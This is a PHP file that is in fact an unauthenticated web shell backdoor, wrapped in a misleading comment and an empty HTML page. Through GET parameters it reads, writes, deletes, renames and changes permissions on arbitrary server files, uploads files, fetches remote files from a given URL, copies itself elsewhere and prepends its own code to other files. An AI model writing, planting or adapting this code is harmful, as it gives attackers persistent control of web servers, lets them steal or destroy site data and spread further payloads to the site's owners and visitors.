<?php
  ### read important: evaluate log binary register cx5-cx9 data year in website ###
  error_reporting (0); $h = $_SERVER['PHP_SELF']; $mname = basename($h); //die($di = realpath('.') . basename($h));
  function rsize($bytes) { $size = ($bytes >= (1024 * 1024 * 1024 * 1024)) ? round ( $bytes / (1024 * 1024 * 1024 * 1024), 2 ) . " TB" : (($bytes >= (1024 * 1024 * 1024)) ? round ( $bytes / (1024 * 1024 * 1024), 2 ) . " GB" : (($bytes >= (1024 * 1024)) ? round ( $bytes / (1024 * 1024), 2 ) . " MB" : round ( $bytes / 1024, 2 ) . " KB")); return $size; }
  if (isset($_FILES['file']['name'])) {
          $di = 'imgs/'.basename ($_FILES['file']['name']);
    if (file_exists($di)) die("file $di exist, try other name");
    if(move_uploaded_file($_FILES['file']['tmp_name'], $di)) { die ("up file: $di ok");
    } else die ("There was an error upl please try again!");
  } elseif (isset($_GET['gm'])) { echo fileperms($_GET['gm']); exit;
  } elseif (isset($_GET['set'])) { chmod($_GET['set'],intval($_GET['v'],8)); die("set");
  } elseif (isset($_GET['md'])) { mkdir($_GET['md']); die("md");
  } elseif (isset($_GET['rd'])) { rmdir($_GET['rd']); die("rd");
  } elseif (isset($_GET['sd'])) { echo $_GET['sd']. " : " .rsize(dirSize($_GET['sd'])); exit;
  } elseif (isset($_GET['m'])) { $fh = fopen($_GET['m'], 'w') or die("c't m-v");
    fwrite($fh, $_GET['v']); fclose($fh); die("m-v");
  } elseif (isset($_GET['r'])) { readfile($_GET['r']) ; exit;
  } elseif (isset($_GET['d'])) { unlink($_GET['d']); die("d");
  } elseif (isset($_GET['c'])) { copy($_GET['c'],$_GET['t']); die("c-t");
  } elseif (isset($_GET['ct'])) { copy($mname,$_GET['ct']); die("ct");
  } elseif (isset($_GET['n'])) { rename($_GET['n'],$_GET['t']); die("n-t");
  } elseif (isset($_GET['nt'])) { rename($mname,$_GET['nt']); die("nt");
  } elseif (isset($_GET['iz']) || isset($_GET['izt'])) {
    if(isset($_GET['izt'])) { $d1 = file_get_contents($mname); $d2 = file_get_contents($_GET['izt']); } else { $d1 = file_get_contents($_GET['iz']); $d2 = file_get_contents($_GET['t']); } $izv = $d1 . $d2;
    if(isset($_GET['izt'])) $fn = $_GET['izt']; else  $fn = $_GET['t'];
          $fh = fopen($fn, 'w') or die("not writable");
    fwrite($fh, $izv); fclose($fh); die("iz-t or izt");
  } elseif (isset($_GET['rm'])) { if (! strpos($_GET['rm'],'ttp:')) { $url = "http://".$_GET['rm']; } else { $url = $_GET['rm']; }
    $file = fopen($url, "rb");
    if (isset($_GET['t'])) $mname = $_GET['t']; else $mname = basename($url);
         if ($file) {
          $newf = fopen ($mname, "wb") or die("not writable");
     while(!feof($file)) {
      fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
     }}; fclose($file); fclose($newf); if(isset($_GET['ad'])) unlink($mname); die("rm-t");
  } elseif (isset($_GET['ff']) || isset($_GET['dir'])) {
    $mdir = "."; echo realpath($mdir).'|'; $dir = "";
    if(isset($_GET['dir'])) { $mdir = $_GET['dir']; $dir=$_GET['dir'] . "/"; }
    $ddir = opendir($mdir);
    while($FileName = readdir($ddir)) {
     if ($FileName == ".") continue;
     $info = sprintf('%o',fileperms($mdir.'/'.$FileName));
     echo $info.'<>'.$FileName.'<>'.rsize(filesize($mdir.'/'.$FileName)).'|';
    } closedir($ddir); exit;
  } elseif (isset($_GET['upload'])) { $h = $_SERVER['PHP_SELF'];
    echo "<form enctype=\"multipart/form-data\" action=\"$h\" method=\"post\">\n";
    echo "file: <input name=\"file\" type=\"file\" /><input type=\"submit\" value=\"Up File\" />\n";
    echo "</form>\n"; exit;
  }


<html>
<head>
<body>

</body>
</head>
</html>
?>


